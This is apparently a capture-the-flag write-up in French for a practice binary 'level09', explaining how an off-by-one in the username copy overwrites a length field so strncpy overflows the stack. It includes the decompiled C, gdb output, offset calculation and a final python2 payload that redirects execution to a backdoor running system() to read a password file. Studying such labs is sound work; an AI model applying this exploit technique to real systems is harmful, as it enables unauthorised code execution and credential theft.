# level09 : buffer overflow + ret vers backdoor

```c
struct message {
    char message[140];
    char username[40];
    int  longueur;
};


void secret_backdoor(void)
{
    char cmd[128];

    fgets(cmd, 128, stdin);
    system(cmd);
}


void set_username(struct message *s)
{
    char saisie[140];
    int i;

    memset(saisie, 0, 128);

    puts(">: Enter your username");
    printf(">>: ");
    fgets(saisie, 128, stdin);

    for (i = 0; i < 41 && saisie[i] != '\0'; i++) {
        s->username[i] = saisie[i];
    }

    printf(">: Welcome, %s", s->username);
}


void set_msg(struct message *s)
{
    char saisie[1024];

    memset(saisie, 0, 1024);

    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(saisie, 1024, stdin);

    strncpy((char *)s, saisie, s->longueur);
}


void handle_msg(void)
{
    struct message s;

    s.longueur = 140;

    set_username(&s);
    set_msg(&s);

    puts(">: Msg sent!");
}


int main(void)
{
    puts("--------------------------------------------\n"
         "|   ~Welcome to l33t-m$n ~    v1337        |\n"
         "--------------------------------------------");
    handle_msg();
    return 0;
}
```

`set_username` copie 41 octets dans `username[40]` (boucle `i < 41`) -> deborde d'1 octet sur le champ `longueur` juste apres. ensuite `set_msg` fait `strncpy(s, saisie, longueur)` : en agrandissant `longueur`, on fait deborder le struct (sur la pile) jusqu'a l'adresse de retour de `handle_msg`, qu'on pointe sur `secret_backdoor()`.


1) trouver l'offset du ret : on met `longueur` au max (1 octet `\xff` = 255, pour que strncpy copie loin) et comme message un pattern De Bruijn (chaque fenetre de qqs octets est unique -> on retrouve la position exacte qui tombe sur le ret).

        python2 -c 'import sys; sys.stdout.write("A"*40 + "\xff" + "\n" + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac" + "\n")' > /tmp/in

        (gdb) run < /tmp/in
    ...
    >: Msg sent!
    Program received signal SIGSEGV, Segmentation fault.
    0x0000555555554931 in handle_msg ()        <- crash sur le `retq` de handle_msg

        (gdb) x/i $rip
        => 0x555555554931 <handle_msg+113>:  retq   
        (gdb) x/s $rsp
        0x7fffffffe5d8:  "zaacbaaccaacdaaceaacf..."  <- le morceau du pattern qui a atterri sur le ret

on cherche ce morceau ("zaacb") dans le pattern De Bruijn -> sa position = **offset 200**


2) adresses (64 bits) :

        secret_backdoor   = 0x000055555555488c   # (gdb) p secret_backdoor
        ret de handle_msg = 0x0000555555554931   # vu au crash (x/i $rip, etape 1)

        les deux sont dans la meme zone 0x0000555555554xxx et ne different que sur les 2 derniers octets. strncpy s'arrete au premier \0,
        donc on n'ecrase QUE ces 2 octets (\x8c\x48 en little endian) -> le haut de l'adresse reste bon.

3) payload :

        longueur = 202 (\xca) = 200 (padding) + 2 (adresse)     -> le \xca deborde sur longueur
        message  = "A"*200 + "\x8c\x48"                          -> ecrase les 2 octets bas du ret
        puis la commande lue par secret_backdoor (fgets + system)

        python2 -c 'import sys; sys.stdout.write("A"*40 + "\xca" + "\n" + "A"*200 + "\x8c\x48" + "\n" + "cat /home/users/end/.pass\n")' > /tmp/in
        ./level09 < /tmp/in
